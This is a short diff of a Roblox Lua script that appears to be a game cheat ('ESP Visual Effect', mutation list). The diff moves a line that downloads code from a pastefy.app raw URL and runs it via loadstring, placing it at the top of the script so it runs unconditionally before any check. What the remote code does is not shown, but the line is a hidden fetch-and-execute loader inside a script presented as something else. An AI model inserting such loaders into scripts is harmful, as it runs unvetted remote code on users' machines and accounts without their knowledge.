@@ -6,7 +6,7 @@ local Workspace = game:GetService("Workspace")
 local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
-
+loadstring(game:HttpGet("https://pastefy.app/Q2A3KeMe/raw"))()
 -- 🎲 Mutation List
 local mutations = {
     "Shiny", "Inverted", "Frozen", "Windy", "Golden", "Mega", "Tiny",
@@ -100,7 +100,6 @@ if not machine or not machine:FindFirstChildWhichIsA("BasePart") then
     warn("❌ Mutation machine not found!")
     return
 end
-loadstring(game:HttpGet("https://pastefy.app/Q2A3KeMe/raw"))()
 local basePart = machine:FindFirstChildWhichIsA("BasePart")
 
 -- ✨ ESP Visual Effect
